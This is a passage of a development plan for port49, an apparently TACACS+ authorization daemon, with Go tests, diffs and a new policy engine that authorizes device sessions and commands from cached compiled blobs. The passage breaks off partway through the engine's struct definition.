§11's policy and tests run against an inventory and pass; its claims
hold as decisions; shuffling every list in it changes no decision down
to the rule a record names. Lint reports scopes attaching a permit,
subjects with no grant, api: rights, group subjects nobody can mint for
yet, mandatory attributes, attribute shadowing, and devices a scope
took in because their version could not be compared.

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 12: The daemon's authorizer decides against the blob

**Files:**
- Create: `internal/daemon/author/engine.go`
- Modify: `internal/daemon/author/author.go`, `internal/daemon/author/lab.go`,
  `internal/daemon/author/blob.go`, `internal/daemon/metrics/metrics.go`
- Test: `internal/daemon/author/engine_test.go`; modify `internal/daemon/author/author_test.go`,
  `internal/daemon/author/blob_test.go`, `internal/daemon/metrics/metrics_test.go`,
  `internal/daemon/server/server_test.go`

**Interfaces:**
- Consumes: `engine.Decode`, `Compile`, `Program.Command`, `Blob.SessionAttributes`,
  `Outcome.Policy`, `Outcome.ServerMsg` (Tasks 5, 6); `decision.BlobPlatformMismatch` (Task 2).
- Produces:
  - `type Request struct { Context store.Context; Device authen.Peer; Raw, Vector []string }`.
  - `type Authorizer interface { Session(ctx context.Context, r Request) Decision; Command(ctx context.Context, r Request) Decision }`
    — the device reaches the authorizer, which is what the platform check and `{device}` need.
  - `Decision` gains `Policy *decision.Policy`, which `Handle` puts on the record, permit or deny.
  - `Handle` answers `store_unavailable` ERROR, not FAIL (Decided 13; Question 3).
  - `type Engine struct { Store store.Store; Metrics *metrics.Metrics; Fallback Authorizer }` —
    `Metrics` is required.
  - `metrics.Metrics.BlobCache` — `port49_blob_cache_lookups_total{outcome}`, `hit` or `miss`.
  `author.Lab` and plan 3's `author.Blob` move to the new signatures; Task 13 wires `Engine` and
  deletes `Blob`. `blobUnavailableMsg` and `denyAll` move from `blob.go` to `engine.go`.

Engine answers a context with a blob; a context without one is `Fallback`'s, or denied. A blob the
store does not hold, or holds wrong, is `blob_unavailable` (FAIL); a store that does not answer is
`store_unavailable` (ERROR); a blob compiled for another platform than the device's is
`blob_platform_mismatch` — the two carries from plan 3. A cached blob answers through a store
outage (spec §5.1.1).

- [ ] **Step 1: Write the failing tests, and move the existing ones to the new signatures**

<!-- write: internal/daemon/author/engine_test.go -->
```go
package author

import (
	"bytes"
	"context"
	"errors"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/prometheus/client_golang/prometheus"
	"github.com/prometheus/client_golang/prometheus/testutil"

	"github.com/rhwendt/port49/internal/daemon/metrics"
	"github.com/rhwendt/port49/internal/decision"
	"github.com/rhwendt/port49/internal/engine"
	"github.com/rhwendt/port49/internal/platform"
	"github.com/rhwendt/port49/internal/store"
	"github.com/rhwendt/port49/internal/store/memory"
	"github.com/rhwendt/port49/internal/tacacs/wire"
)

// eosBlob is a compiled blob for arista_eos in the shape the broker writes.
func eosBlob() engine.Blob {
	return engine.Blob{Bundle: "sha256:policy", Platform: "arista_eos",
		Normalize: engine.Normalize{PipeToken: "|", StripCR: true}, Privilege: "admin",
		Attributes: []string{"priv-lvl=15", "home-directory*/home/{username}"},
		Rules: []engine.Rule{
			{Verdict: engine.Permit, Rule: "**", Role: "network_admin"},
			{Verdict: engine.Deny, Rule: "show hostname", Role: "slice_denies"},
			{Verdict: engine.Deny, Rule: "interface @management", Role: "safety"},
		},
		Pipe:    []string{"include **"},
		Classes: map[string][]string{"management": {`^Management[0-9]+$`}}}
}

// flakyBlobStore answers GetBlob from the memory store until down is set.
type flakyBlobStore struct {
	*memory.Store
	down bool
}

func (f *flakyBlobStore) GetBlob(ctx context.Context, hash string) ([]byte, error) {
	if f.down {
		return nil, errors.New("store: connection refused")
	}
	return f.Store.GetBlob(ctx, hash)
}

type engineFixture struct {
	st   *flakyBlobStore
	m    *metrics.Metrics
	h    *Handler
	log  *bytes.Buffer
	hash string
}

// newEngineFixture puts the blob in the store and a context naming it, as a
// broker-minted login leaves them, and serves them through the real handler.
func newEngineFixture(t *testing.T, b engine.Blob) *engineFixture {
	t.Helper()
	f := &engineFixture{st: &flakyBlobStore{Store: memory.New(time.Now)}, m: metrics.New(prometheus.NewRegistry()),
		log: &bytes.Buffer{}}
	body, hash, err := engine.Encode(b)
	if err != nil {
		t.Fatal(err)
	}
	f.hash = hash
	if err := f.st.PutBlob(context.Background(), hash, body, time.Hour); err != nil {
		t.Fatal(err)
	}
	f.st.PutContext(context.Background(), store.ContextKey{NAS: "leaf-01", Username: "alice"},
		store.Context{CtxID: "ctx1", Username: "alice", Principal: "user:alice@example.com", PrivLvl: 15,
			BlobHash: hash}, time.Hour)
	f.h = New(f.st, &Engine{Store: f.st, Metrics: f.m}, decision.NewJSONLines(f.log), f.m, time.Now,
		platform.Defaults(), time.Hour, time.Minute, time.Hour)
	return f
}

func (f *engineFixture) authorize(t *testing.T, args ...string) (wire.AuthorResponse, map[string]any) {
	t.Helper()
	resp := f.h.Handle(context.Background(), peer, req("alice", "vty0", append([]string{"service=shell"}, args...)...))
	return resp, lastRecord(t, f.log)
}

// A session is answered with the blob's attributes, substituted from the
// context and the device, and its record names the policy (spec §5.2, §5.7).
func TestTheEngineAnswersASessionFromTheBlob(t *testing.T) {
	f := newEngineFixture(t, eosBlob())
	resp, rec := f.authorize(t, "cmd=")
	if resp.Status != wire.AuthorStatusPassAdd || len(resp.Args) != 2 || string(resp.Args[1]) != "home-directory*/home/alice" {
		t.Fatalf("session reply: %+v", resp)
	}
	pol, _ := rec["policy"].(map[string]any)
	if rec["reason"] != "context_matched" || pol["blob"] != f.hash || pol["bundle"] != "sha256:policy" {
		t.Fatalf("session record: %v", rec)
	}
}

// A command is decided by dominance, and the record carries what matched: a
// replay reads it back (spec §5.3, §5.7).
func TestTheEngineDecidesACommandAndSaysWhy(t *testing.T) {
	f := newEngineFixture(t, eosBlob())
	if resp, rec := f.authorize(t, "cmd=show", "cmd-arg=version", "cmd-arg=<cr>"); resp.Status != wire.AuthorStatusPassAdd ||
		rec["reason"] != "permit_dominates" {
		t.Fatalf("show version: %+v %v", resp, rec)
	}
	resp, rec := f.authorize(t, "cmd=interface", "cmd-arg=management1", "cmd-arg=<cr>")
	if resp.Status != wire.AuthorStatusFail || string(resp.ServerMsg) != "port49: denied by safety (interface @management) - see 'port49 explain'" {
		t.Fatalf("a class deny, in any case: %+v", resp)
	}
	pol, _ := rec["policy"].(map[string]any)
	deny, _ := pol["matched_deny"].(map[string]any)
	permits, _ := pol["matched_permits"].([]any)
	if rec["reason"] != "no_permit_dominates_deny" || deny["role"] != "safety" || len(permits) != 1 {
		t.Fatalf("record: %v", rec)
	}
	if resp, rec := f.authorize(t, "cmd=show", "cmd-arg=run", "cmd-arg=|", "cmd-arg=redirect", "cmd-arg=x"); resp.Status != wire.AuthorStatusFail ||
		rec["reason"] != "pipe_stage_denied" {
		t.Fatalf("a pipeline stage off the allowlist: %+v %v", resp, rec)
	}
}

// The blob is cached by hash: a replica answers from its copy while the store
// is down (spec §5.1.1), and the cache and the store read are both counted.
func TestACachedBlobOutlivesAStoreOutage(t *testing.T) {
	f := newEngineFixture(t, eosBlob())
	f.authorize(t, "cmd=show", "cmd-arg=version")
	f.st.down = true
	if resp, _ := f.authorize(t, "cmd=show", "cmd-arg=clock"); resp.Status != wire.AuthorStatusPassAdd {
		t.Fatalf("a cached blob answers through a store outage: %+v", resp)
	}
	if hit, miss := testutil.ToFloat64(f.m.BlobCache.WithLabelValues("hit")), testutil.ToFloat64(f.m.BlobCache.WithLabelValues("miss")); hit != 1 || miss != 1 {
		t.Fatalf("cache hit %v miss %v", hit, miss)
	}
	if n := testutil.ToFloat64(f.m.StoreOps.WithLabelValues("get_blob", "ok")); n != 1 {
		t.Fatalf("get_blob ok: %v", n)
	}
}

// A store that does not answer is store_unavailable, answered ERROR so the
// device falls to its next method; a blob the store does not hold, or holds
// wrong, is blob_unavailable, FAIL (spec §5.7; roadmap, carried from plan 3).
func TestAStoreErrorIsStoreUnavailableAndAMissingBlobIsNot(t *testing.T) {
	f := newEngineFixture(t, eosBlob())
	f.st.down = true
	resp, rec := f.authorize(t, "cmd=show", "cmd-arg=version")
	if resp.Status != wire.AuthorStatusError || rec["reason"] != "store_unavailable" {
		t.Fatalf("store down: %+v %v", resp, rec)
	}
	f.st.down = false
	for name, hash := range map[string]string{
		"missing": engine.HashOf([]byte("nothing was stored under this")),
		"corrupt": "sha256:wrong",
	} {
		f.st.PutBlob(context.Background(), "sha256:wrong", []byte(`{"version":2}`), time.Hour)
		f.st.PutContext(context.Background(), store.ContextKey{NAS: "leaf-01", Username: "alice"},
			store.Context{CtxID: "ctx1", Username: "alice", PrivLvl: 15, BlobHash: hash}, time.Hour)
		resp, rec := f.authorize(t, "cmd=show", "cmd-arg=version")
		if resp.Status != wire.AuthorStatusFail || rec["reason"] != "blob_unavailable" {
			t.Fatalf("%s: %+v %v", name, resp, rec)
		}
	}
}

// A blob compiled for another platform than the device's is never answered
// from: its attributes and its dialect are another vendor's (roadmap, plan 4,
// carried from plan 3).
func TestABlobForAnotherPlatformIsRefused(t *testing.T) {
	b := eosBlob()
	b.Platform = "cisco_nxos"
	f := newEngineFixture(t, b)
	for _, args := range [][]string{{"cmd="}, {"cmd=show", "cmd-arg=version"}} {
		resp, rec := f.authorize(t, args...)
		if resp.Status != wire.AuthorStatusFail || rec["reason"] != "blob_platform_mismatch" ||
			!strings.HasPrefix(string(resp.ServerMsg), "port49: ") {
			t.Fatalf("%q: %+v %v", args, resp, rec)
		}
	}
}

// A context with no blob is the fallback's, and with no fallback it is denied:
// port49 never falls back to permitting everything.
func TestAContextWithNoBlobIsTheFallbacksOrDenied(t *testing.T) {
	e := &Engine{Store: memory.New(time.Now), Metrics: metrics.New(prometheus.NewRegistry())}
	r := Request{Context: store.Context{Username: "alice"}, Device: peer, Vector: []string{"show", "version"}}
	if d := e.Command(context.Background(), r); d.Permit || d.Reason != decision.NoRuleMatched {
		t.Fatalf("no fallback: %+v", d)
	}
	e.Fallback = &Lab{SessionAttributes: []string{"priv-lvl=15"}}
	if d := e.Session(context.Background(), r); !d.Permit || !reflect.DeepEqual(d.Attributes, []string{"priv-lvl=15"}) {
		t.Fatalf("the lab's seeded contexts keep the lab's answers: %+v", d)
	}
}

// A substitution that no longer fits on the wire sends nothing partial.
func TestAnOverlongSubstitutionIsNotSent(t *testing.T) {
	f := newEngineFixture(t, eosBlob())
	long := strings.Repeat("a", 250)
	f.st.PutContext(context.Background(), store.ContextKey{NAS: "leaf-01", Username: "alice"},
		store.Context{CtxID: "ctx1", Username: long, PrivLvl: 15, BlobHash: f.hash}, time.Hour)
	d := (&Engine{Store: f.st, Metrics: f.m}).Session(context.Background(),
		Request{Context: store.Context{Username: long, BlobHash: f.hash}, Device: peer})
	if d.Permit || d.Reason != decision.BlobUnavailable || len(d.Attributes) != 0 {
		t.Fatalf("%+v", d)
	}
}
```

`TestGetContextStoreErrorIsNotContextMissing` now expects ERROR (Decided 13); the rest of this
patch is the new signatures:

<!-- patch: internal/daemon/author/author_test.go -->
```diff
diff --git a/internal/daemon/author/author_test.go b/internal/daemon/author/author_test.go
index 4a3c730..1661d22 100644
--- a/internal/daemon/author/author_test.go
+++ b/internal/daemon/author/author_test.go
@@ -135,10 +135,10 @@ func TestVector(t *testing.T) {
 
 func TestLabCommandPrefixBoundary(t *testing.T) {
 	l := &Lab{DenyPrefixes: []string{"show"}}
-	if d := l.Command(context.Background(), store.Context{}, []string{"show", "version"}, nil); d.Permit {
+	if d := l.Command(context.Background(), Request{Vector: []string{"show", "version"}}); d.Permit {
 		t.Fatalf("expected \"show version\" to be denied by prefix \"show\": %+v", d)
 	}
-	if d := l.Command(context.Background(), store.Context{}, []string{"shower"}, nil); !d.Permit {
+	if d := l.Command(context.Background(), Request{Vector: []string{"shower"}}); !d.Permit {
 		t.Fatalf("expected \"shower\" to be permitted (no token boundary match): %+v", d)
 	}
 }
@@ -261,8 +261,11 @@ func TestGetContextStoreErrorIsNotContextMissing(t *testing.T) {
 	h := New(st, lab, decision.NewJSONLines(log), metrics.New(prometheus.NewRegistry()), time.Now,
 		platform.Defaults(), time.Hour, time.Minute, time.Hour)
 
+	// ERROR, not FAIL: "not me, ask the next method" (spec §5.7), so a device
+	// with a local fallback keeps its operators working on the device role
+	// while the store is down (design §12).
 	resp := h.Handle(context.Background(), peer, req("alice", "vty0", "service=shell", "cmd=show"))
-	if resp.Status != wire.AuthorStatusFail || string(resp.ServerMsg) != "port49: authorization store unavailable" {
+	if resp.Status != wire.AuthorStatusError || string(resp.ServerMsg) != "port49: authorization store unavailable" {
 		t.Fatalf("%+v", resp)
 	}
 	r := lastRecord(t, log)
@@ -473,7 +476,7 @@ func TestLabCommandAttributes(t *testing.T) {
 		DenyPrefixes:      []string{"reload"},
 	}
 
-	d := l.Command(context.Background(), store.Context{}, []string{"show", "version"}, nil)
+	d := l.Command(context.Background(), Request{Vector: []string{"show", "version"}})
 	if !d.Permit {
 		t.Fatalf("expected a permit for \"show version\": %+v", d)
 	}
@@ -481,7 +484,7 @@ func TestLabCommandAttributes(t *testing.T) {
 		t.Fatalf("a permitted command reply should carry the configured command attributes, got %q", d.Attributes)
 	}
 
-	if d := l.Command(context.Background(), store.Context{}, []string{"reload"}, nil); d.Permit {
+	if d := l.Command(context.Background(), Request{Vector: []string{"reload"}}); d.Permit {
 		t.Fatalf("expected \"reload\" to be denied: %+v", d)
 	} else if len(d.Attributes) != 0 {
 		t.Fatalf("a DENIED command reply must carry no attributes, got %q", d.Attributes)
@@ -489,14 +492,14 @@ func TestLabCommandAttributes(t *testing.T) {
 
 	// The two lists are separate: a session reply does not pick up command
 	// attributes, which is what makes L18 able to vary one at a time.
-	s := l.Session(context.Background(), store.Context{}, nil)
+	s := l.Session(context.Background(), Request{})
 	if len(s.Attributes) != 1 || s.Attributes[0] != "priv-lvl=15" {
 		t.Fatalf("the session reply should carry only the session attributes, got %q", s.Attributes)
 	}
 
 	// Unset is the shipped shape and must stay a bare permit.
 	bare := &Lab{DenyPrefixes: []string{"reload"}}
-	if d := bare.Command(context.Background(), store.Context{}, []string{"show", "version"}, nil); len(d.Attributes) != 0 {
+	if d := bare.Command(context.Background(), Request{Vector: []string{"show", "version"}}); len(d.Attributes) != 0 {
 		t.Fatalf("with no command_attributes configured the reply must carry none, got %q", d.Attributes)
 	}
 }
```

<!-- patch: internal/daemon/author/blob_test.go -->
```diff
diff --git a/internal/daemon/author/blob_test.go b/internal/daemon/author/blob_test.go
index d3caf05..7e1906c 100644
--- a/internal/daemon/author/blob_test.go
+++ b/internal/daemon/author/blob_test.go
@@ -31,7 +31,7 @@ func blobFixture(t *testing.T) (*Blob, store.Context) {
 // blob's attributes — not the lab's.
 func TestABlobContextIsAnsweredFromItsBlob(t *testing.T) {
 	a, c := blobFixture(t)
-	d := a.Session(context.Background(), c, nil)
+	d := a.Session(context.Background(), Request{Context: c})
 	if !d.Permit || d.Reason != decision.ContextMatched || len(d.Attributes) != 1 || d.Attributes[0] != "priv-lvl=15" {
 		t.Fatalf("session: %+v", d)
 	}
@@ -45,7 +45,7 @@ func TestABlobContextIsAnsweredFromItsBlob(t *testing.T) {
 		// The lab's own deny list does not apply to a blob context.
 		{[]string{"show", "clock"}, true, decision.PermitDominates},
 	} {
-		d := a.Command(context.Background(), c, tt.vector, nil)
+		d := a.Command(context.Background(), Request{Context: c, Vector: tt.vector})
 		if d.Permit != tt.permit || d.Reason != tt.reason {
 			t.Errorf("Command(%q) = %+v, want permit=%v %s", tt.vector, d, tt.permit, tt.reason)
 		}
@@ -54,7 +54,7 @@ func TestABlobContextIsAnsweredFromItsBlob(t *testing.T) {
 		}
 	}
 	if d := (&Blob{Store: a.Store, Fallback: a.Fallback}).Command(context.Background(),
-		store.Context{BlobHash: c.BlobHash}, []string{"configure"}, nil); !d.Permit {
+		Request{Context: store.Context{BlobHash: c.BlobHash}, Vector: []string{"configure"}}); !d.Permit {
 		t.Fatalf("`**` permits configure: %+v", d)
 	}
 }
@@ -80,10 +80,10 @@ func TestAMissingOrCorruptBlobIsBlobUnavailable(t *testing.T) {
 	refused := c
 	refused.BlobHash = blob.HashOf(body)
 	for name, cc := range map[string]store.Context{"missing": missing, "corrupt": corrupt, "refused": refused} {
-		if d := a.Session(context.Background(), cc, nil); d.Permit || d.Reason != decision.BlobUnavailable {
+		if d := a.Session(context.Background(), Request{Context: cc}); d.Permit || d.Reason != decision.BlobUnavailable {
 			t.Errorf("%s: session %+v", name, d)
 		}
-		if d := a.Command(context.Background(), cc, []string{"show", "version"}, nil); d.Permit || d.Reason != decision.BlobUnavailable {
+		if d := a.Command(context.Background(), Request{Context: cc, Vector: []string{"show", "version"}}); d.Permit || d.Reason != decision.BlobUnavailable {
 			t.Errorf("%s: command %+v", name, d)
 		}
 	}
@@ -93,19 +93,19 @@ func TestAMissingOrCorruptBlobIsBlobUnavailable(t *testing.T) {
 func TestAContextWithNoBlobIsTheFallbacks(t *testing.T) {
 	a, _ := blobFixture(t)
 	c := store.Context{CtxID: "c", Username: "alice"}
-	if d := a.Session(context.Background(), c, nil); !d.Permit || d.Attributes[0] != "lab-attr=1" {
+	if d := a.Session(context.Background(), Request{Context: c}); !d.Permit || d.Attributes[0] != "lab-attr=1" {
 		t.Fatalf("session: %+v", d)
 	}
-	if d := a.Command(context.Background(), c, []string{"show", "clock"}, nil); d.Permit {
+	if d := a.Command(context.Background(), Request{Context: c, Vector: []string{"show", "clock"}}); d.Permit {
 		t.Fatalf("the lab's deny list applies to a seeded context: %+v", d)
 	}
 	// With no fallback configured, a context with no blob is denied, not
 	// permitted and not a panic.
 	a.Fallback = nil
-	if d := a.Session(context.Background(), c, nil); d.Permit || d.Reason != decision.NoRuleMatched {
+	if d := a.Session(context.Background(), Request{Context: c}); d.Permit || d.Reason != decision.NoRuleMatched {
 		t.Fatalf("nil fallback session: %+v", d)
 	}
-	if d := a.Command(context.Background(), c, []string{"show", "version"}, nil); d.Permit || d.Reason != decision.NoRuleMatched {
+	if d := a.Command(context.Background(), Request{Context: c, Vector: []string{"show", "version"}}); d.Permit || d.Reason != decision.NoRuleMatched {
 		t.Fatalf("nil fallback command: %+v", d)
 	}
 }
```

<!-- patch: internal/daemon/metrics/metrics_test.go -->
```diff
diff --git a/internal/daemon/metrics/metrics_test.go b/internal/daemon/metrics/metrics_test.go
index 05dac9d..65a3d0f 100644
--- a/internal/daemon/metrics/metrics_test.go
+++ b/internal/daemon/metrics/metrics_test.go
@@ -29,6 +29,7 @@ func TestNewRegistersEveryMetric(t *testing.T) {
 	m.CryptOpenFailures.WithLabelValues("context").Inc()
 	m.Attributions.WithLabelValues("foreign").Inc()
 	m.BrokerItemErrors.WithLabelValues("device_unconfigured").Inc()
+	m.BlobCache.WithLabelValues("hit").Inc()
 
 	// Gather all metrics from registry.
 	families, err := reg.Gather()
@@ -53,6 +54,7 @@ func TestNewRegistersEveryMetric(t *testing.T) {
 		"port49_crypt_open_failures_total":         false,
 		"port49_accounting_attributions_total":     false,
 		"port49_broker_item_errors_total":          false,
+		"port49_blob_cache_lookups_total":          false,
 	}
 
 	// Check that all expected metrics are present and all gathered metrics are snake_case.
```

<!-- patch: internal/daemon/server/server_test.go -->
```diff
diff --git a/internal/daemon/server/server_test.go b/internal/daemon/server/server_test.go
index 70c3fce..3cf45b7 100644
--- a/internal/daemon/server/server_test.go
+++ b/internal/daemon/server/server_test.go
@@ -529,11 +529,11 @@ func TestStoreErrorAnswersErrorEndToEnd(t *testing.T) {
 // outside the package: nothing in the daemon's own code is meant to panic.
 type panicAuthorizer struct{}
 
-func (panicAuthorizer) Session(context.Context, store.Context, []string) author.Decision {
+func (panicAuthorizer) Session(context.Context, author.Request) author.Decision {
 	panic("port49 test: deliberate panic inside an authorizer")
 }
 
-func (panicAuthorizer) Command(context.Context, store.Context, []string, []string) author.Decision {
+func (panicAuthorizer) Command(context.Context, author.Request) author.Decision {
 	panic("port49 test: deliberate panic inside an authorizer")
 }
 
```

- [ ] **Step 2: Run them to see them fail**

Run: `go vet ./internal/daemon/...`
Expected: FAIL to build — `undefined: Request`, `undefined: Engine`, `m.BlobCache undefined`.

- [ ] **Step 3: Change the interface and the handler, and write the engine**

<!-- patch: internal/daemon/author/author.go -->
```diff
diff --git a/internal/daemon/author/author.go b/internal/daemon/author/author.go
index 9f27a7b..d2bdd84 100644
--- a/internal/daemon/author/author.go
+++ b/internal/daemon/author/author.go
@@ -18,18 +18,31 @@ import (
 	"github.com/rhwendt/port49/internal/tacacs/wire"
 )
 
-// Decision is what an Authorizer returns; the policy engine (plan 4)
-// implements Authorizer for real.
+// Decision is what an Authorizer returns. Engine is the one the daemon runs;
+// Lab is the lab's instrument for seeded contexts.
 type Decision struct {
 	Permit     bool
 	Reason     decision.Reason
 	ServerMsg  string
 	Attributes []string // session only, e.g. "priv-lvl=15"
+	// Policy is the record's policy block when the decision consulted a blob
+	// (spec §5.7): bundle and blob always, and the rules that matched.
+	Policy *decision.Policy
+}
+
+// Request is one authorization after the §5.3 checks have passed: the context
+// they read, the device the request came from, and the request's AV pairs as
+// received. Vector is nil for a session authorization.
+type Request struct {
+	Context store.Context
+	Device  authen.Peer
+	Raw     []string
+	Vector  []string
 }
 
 type Authorizer interface {
-	Session(ctx context.Context, c store.Context, args []string) Decision
-	Command(ctx context.Context, c store.Context, vector []string, args []string) Decision
+	Session(ctx context.Context, r Request) Decision
+	Command(ctx context.Context, r Request) Decision
 }
 
 type Handler struct {
@@ -242,11 +255,13 @@ func (h *Handler) Handle(ctx context.Context, peer authen.Peer, req wire.AuthorR
 	}
 
 	var d Decision
+	ar := Request{Context: c, Device: peer, Raw: raw, Vector: vector}
 	if cmd == "" {
-		d = h.authz.Session(ctx, c, raw)
+		d = h.authz.Session(ctx, ar)
 	} else {
-		d = h.authz.Command(ctx, c, vector, raw)
+		d = h.authz.Command(ctx, ar)
 	}
+	rec.Policy = d.Policy
 	if !d.Permit {
 		return h.deny(rec, d.Reason, d.ServerMsg)
 	}
@@ -326,10 +341,20 @@ func (h *Handler) Handle(ctx context.Context, peer authen.Peer, req wire.AuthorR
 	return resp
 }
 
+// deny answers FAIL, except for a store port49 could not reach, which is
+// ERROR: "not me, ask the next method" (spec §5.7). A device configured with a
+// local fallback then authorizes by its own role, which is the degraded-mode
+// policy spec §6 says the device role is — the store-unavailable row of the
+// design §12 failure matrix. A FAIL would deny every command of every live
+// login for as long as the store is down.
 func (h *Handler) deny(rec decision.Record, reason decision.Reason, msg string) wire.AuthorResponse {
 	rec.Verdict, rec.Reason, rec.ServerMsg = decision.VerdictDeny, reason, msg
 	h.emit(rec)
-	return wire.AuthorResponse{Status: wire.AuthorStatusFail, ServerMsg: []byte(msg)}
+	status := uint8(wire.AuthorStatusFail)
+	if reason == decision.StoreUnavailable {
+		status = wire.AuthorStatusError
+	}
+	return wire.AuthorResponse{Status: status, ServerMsg: []byte(msg)}
 }
 
 func (h *Handler) emit(rec decision.Record) {
```

<!-- patch: internal/daemon/author/lab.go -->
```diff
diff --git a/internal/daemon/author/lab.go b/internal/daemon/author/lab.go
index c2115bf..e47830e 100644
--- a/internal/daemon/author/lab.go
+++ b/internal/daemon/author/lab.go
@@ -5,12 +5,14 @@ import (
 	"strings"
 
 	"github.com/rhwendt/port49/internal/decision"
-	"github.com/rhwendt/port49/internal/store"
 )
 
-// Lab is the authorizer used before the policy engine exists (plan 4). It
-// returns fixed session attributes and denies commands by prefix, with a
-// server_msg, which is exactly what lab register entries L2 and L10 need.
+// Lab is the lab's measurement instrument, not a policy: it returns fixed
+// session attributes and denies commands by prefix, with a server_msg, which
+// is exactly what lab register entries L2, L10, L16 and L18 vary one attribute
+// at a time. It answers only contexts with no blob — the tokens `lab.seed_tokens`
+// mints — and only where port49d.yaml carries a `lab:` block; Engine answers
+// everything else (plan 4, Decided 12).
 type Lab struct {
 	SessionAttributes []string
 	// CommandAttributes are returned on a PERMITTED per-command authorization,
@@ -33,12 +35,12 @@ type Lab struct {
 	DenyPrefixes []string
 }
 
-func (l *Lab) Session(_ context.Context, _ store.Context, _ []string) Decision {
+func (l *Lab) Session(_ context.Context, _ Request) Decision {
 	return Decision{Permit: true, Reason: decision.ContextMatched, Attributes: l.SessionAttributes}
 }
 
-func (l *Lab) Command(_ context.Context, _ store.Context, vector []string, _ []string) Decision {
-	line := strings.Join(vector, " ")
+func (l *Lab) Command(_ context.Context, r Request) Decision {
+	line := strings.Join(r.Vector, " ")
 	for _, p := range l.DenyPrefixes {
 		// A denial carries no attributes on purpose: its payload is the
 		// server_msg, and a FAIL with arguments hung off it is protocol
```

<!-- patch: internal/daemon/author/blob.go -->
```diff
diff --git a/internal/daemon/author/blob.go b/internal/daemon/author/blob.go
index 5599c26..feaa742 100644
--- a/internal/daemon/author/blob.go
+++ b/internal/daemon/author/blob.go
@@ -39,8 +39,6 @@ type Blob struct {
 	Fallback Authorizer
 }
 
-const blobUnavailableMsg = "port49: the policy for this session could not be read - run `port49 token` and log in again"
-
 func (b *Blob) load(ctx context.Context, c store.Context) (blob.Blob, bool) {
 	body, err := b.Store.GetBlob(ctx, c.BlobHash)
 	if err != nil {
@@ -50,26 +48,26 @@ func (b *Blob) load(ctx context.Context, c store.Context) (blob.Blob, bool) {
 	return bl, err == nil
 }
 
-func (b *Blob) Session(ctx context.Context, c store.Context, args []string) Decision {
-	if c.BlobHash == "" {
-		return b.fallback().Session(ctx, c, args)
+func (b *Blob) Session(ctx context.Context, r Request) Decision {
+	if r.Context.BlobHash == "" {
+		return b.fallback().Session(ctx, r)
 	}
-	bl, ok := b.load(ctx, c)
+	bl, ok := b.load(ctx, r.Context)
 	if !ok {
 		return Decision{Reason: decision.BlobUnavailable, ServerMsg: blobUnavailableMsg}
 	}
 	return Decision{Permit: true, Reason: decision.ContextMatched, Attributes: append([]string(nil), bl.Attributes...)}
 }
 
-func (b *Blob) Command(ctx context.Context, c store.Context, vector []string, args []string) Decision {
-	if c.BlobHash == "" {
-		return b.fallback().Command(ctx, c, vector, args)
+func (b *Blob) Command(ctx context.Context, r Request) Decision {
+	if r.Context.BlobHash == "" {
+		return b.fallback().Command(ctx, r)
 	}
-	bl, ok := b.load(ctx, c)
+	bl, ok := b.load(ctx, r.Context)
 	if !ok {
 		return Decision{Reason: decision.BlobUnavailable, ServerMsg: blobUnavailableMsg}
 	}
-	switch bl.Command(vector) {
+	switch bl.Command(r.Vector) {
 	case blob.Permitted:
 		return Decision{Permit: true, Reason: decision.PermitDominates}
 	case blob.Denied:
@@ -87,13 +85,3 @@ func (b *Blob) fallback() Authorizer {
 	}
 	return b.Fallback
 }
-
-type denyAll struct{}
-
-func (denyAll) Session(context.Context, store.Context, []string) Decision {
-	return Decision{Reason: decision.NoRuleMatched, ServerMsg: "port49: no policy for this session"}
-}
-
-func (denyAll) Command(context.Context, store.Context, []string, []string) Decision {
-	return Decision{Reason: decision.NoRuleMatched, ServerMsg: "port49: no policy for this session"}
-}
```

<!-- patch: internal/daemon/metrics/metrics.go -->
```diff
diff --git a/internal/daemon/metrics/metrics.go b/internal/daemon/metrics/metrics.go
index 079dfe5..2e50a56 100644
--- a/internal/daemon/metrics/metrics.go
+++ b/internal/daemon/metrics/metrics.go
@@ -52,6 +52,11 @@ type Metrics struct {
 	// compiled to a blob the daemon would refuse). Neither is a decision, so
 	// neither is in port49_decisions_total. The label is the code only.
 	BrokerItemErrors *prometheus.CounterVec
+	// port49_blob_cache_lookups_total{outcome}: the authorizer's per-replica
+	// blob cache, "hit" or "miss" (spec §5.1.1). A miss is one store read,
+	// counted again in port49_store_operations_total{op="get_blob"}; a hit
+	// during a store outage is a command still being answered.
+	BlobCache *prometheus.CounterVec
 }
 
 func New(reg prometheus.Registerer) *Metrics {
@@ -91,9 +96,11 @@ func New(reg prometheus.Registerer) *Metrics {
 			Help: "Accounting records accepted, by attribution."}, []string{"attribution"}),
 		BrokerItemErrors: prometheus.NewCounterVec(prometheus.CounterOpts{Name: "port49_broker_item_errors_total",
 			Help: "Mint items the broker could not decide, by API error code."}, []string{"error"}),
+		BlobCache: prometheus.NewCounterVec(prometheus.CounterOpts{Name: "port49_blob_cache_lookups_total",
+			Help: "Compiled-blob cache lookups by the authorizer, by outcome."}, []string{"outcome"}),
 	}
 	reg.MustRegister(m.Requests, m.Latency, m.Decisions, m.Unvalidated, m.KeyValidations,
 		m.Connections, m.ConnectionEvents, m.AuthFailures, m.SpoolDepth, m.SpoolDrops, m.SpoolQuarantines,
-		m.StoreOps, m.DecisionLogWriteFailures, m.CryptOpenFailures, m.Attributions, m.BrokerItemErrors)
+		m.StoreOps, m.DecisionLogWriteFailures, m.CryptOpenFailures, m.Attributions, m.BrokerItemErrors, m.BlobCache)
 	return m
 }
```

<!-- write: internal/daemon/author/engine.go -->
```go
package author

import (
	"context"
	"errors"
	"sync"

	"github.com/rhwendt/port49/internal/daemon/metrics"
	"github.com/rhwendt/port49/internal/decision"
	"github.com/rhwendt/port49/internal/engine"
	"github.com/rhwendt/port49/internal/store"
)

// Engine is the daemon's Authorizer: it answers from the compiled blob a
// context names (spec §5.1.2, §5.2, §5.3), with the evaluator
// internal/engine runs for replay and explain too, so what the daemon decided
// is what a replay reproduces (spec §5.7).
//
// Blobs are immutable and named by their hash, so each replica caches them
// compiled, by hash, with no invalidation (spec §5.1.1). A command on a cached
// blob costs no store read; a blob the store cannot produce is
// blob_unavailable, and a store that does not answer is store_unavailable,
// which the handler answers ERROR so the device falls to its next method.
// Either way nothing falls back: answering a broker-minted session from
// another authorizer because the store hiccuped would be a permit nobody
// granted.
//
// A context with no blob hash is Fallback's: the lab's seeded tokens are
// minted without one. With no Fallback it is denied.
type Engine struct {
	Store    store.Store
